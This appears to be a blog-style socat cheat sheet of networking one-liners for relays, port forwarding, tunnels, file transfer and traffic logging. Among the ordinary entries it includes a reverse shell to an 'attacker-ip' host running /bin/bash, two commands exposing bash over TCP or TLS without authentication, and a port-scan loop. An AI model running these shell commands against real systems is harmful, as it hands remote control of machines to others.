---
title: "Socat Network Swiss Army Knife"
description: "Advanced network relay and debugging with socat."
date: "2025-10-16"
tags: ["socat", "networking", "debugging"]
category: "Network"
---

## TCP client

```bash
socat - TCP:example.com:80
```

## TCP server (listen)

```bash
socat TCP-LISTEN:8080 -
```

## Port forwarding

```bash
socat TCP-LISTEN:8080,fork TCP:target-server:80
```

## UDP relay

```bash
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53
```

## Unix socket to TCP

```bash
socat UNIX-LISTEN:/tmp/socket,fork TCP:localhost:3000
```

## TCP to Unix socket

```bash
socat TCP-LISTEN:3000,fork UNIX-CONNECT:/var/run/app.sock
```

## File transfer server

```bash
socat TCP-LISTEN:9999,fork FILE:/path/to/file
```

## File transfer client

```bash
socat TCP:server:9999 FILE:/path/to/save,create
```

## HTTPS proxy

```bash
socat TCP-LISTEN:8080,fork OPENSSL:example.com:443,verify=0
```

## SSL/TLS server

```bash
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork EXEC:/bin/bash
```

## SSL/TLS client

```bash
socat - OPENSSL:example.com:443,verify=0
```

## Serial port relay

```bash
socat /dev/ttyUSB0,raw,echo=0 TCP-LISTEN:5555
```

## Bidirectional pipe

```bash
socat -d -d PTY,link=/tmp/pty1 PTY,link=/tmp/pty2
```

## HTTP request

```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | socat - TCP:example.com:80
```

## Reverse shell (server)

```bash
socat TCP-LISTEN:4444 -
```

## Reverse shell (client)

```bash
socat TCP:attacker-ip:4444 EXEC:/bin/bash
```

## Port scanner

```bash
for port in {1..1024}; do
    socat -T1 - TCP:target:$port && echo "Port $port open"
done
```

## Multicast sender

```bash
socat - UDP-DATAGRAM:224.0.0.1:6666,broadcast
```

## Multicast receiver

```bash
socat - UDP-RECV:6666,ip-add-membership=224.0.0.1:eth0
```

## Syslog relay

```bash
socat UDP-LISTEN:514,fork TCP:syslog-server:514
```

## Interactive shell through TCP

```bash
socat TCP-LISTEN:5555,fork EXEC:/bin/bash,pty,stderr
```

## Encrypted tunnel

```bash
# Server
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:22

# Client
socat TCP-LISTEN:2222,fork OPENSSL:server:443,verify=0
```

## Logging traffic

```bash
socat -v TCP-LISTEN:8080,fork TCP:target:80
```

## Hex dump traffic

```bash
socat -x TCP-LISTEN:8080,fork TCP:target:80
```

## Rate limiting

```bash
socat -T 60 TCP-LISTEN:8080,fork TCP:target:80
```

## Fork for multiple connections

```bash
socat TCP-LISTEN:8080,fork,reuseaddr TCP:backend:80
```

## Broadcast UDP

```bash
socat - UDP-DATAGRAM:255.255.255.255:9999,broadcast
```

## IPv6 support

```bash
socat TCP6-LISTEN:8080,fork TCP6:target:80
```

## Set source port

```bash
socat TCP:example.com:80,sourceport=5000 -
```

## Bind to specific interface

```bash
socat TCP-LISTEN:8080,fork,bind=192.168.1.100 TCP:target:80
```

## Timeout

```bash
socat -T 30 TCP:example.com:80 -
```

## Keep alive

```bash
socat TCP-LISTEN:8080,fork,keepalive TCP:target:80
```

## Proxy with authentication

```bash
socat TCP-LISTEN:8080,fork PROXY:proxy-server:target:80,proxyport=3128
```

## Compare with netcat

```bash
# Netcat
nc -l 8080

# Socat equivalent
socat TCP-LISTEN:8080 -
```

## Common options

```
-d -d          # Verbose debug output
-v             # Verbose data transfer
-x             # Hex dump
-T <seconds>   # Timeout
fork           # Handle multiple connections
reuseaddr      # Reuse address
```
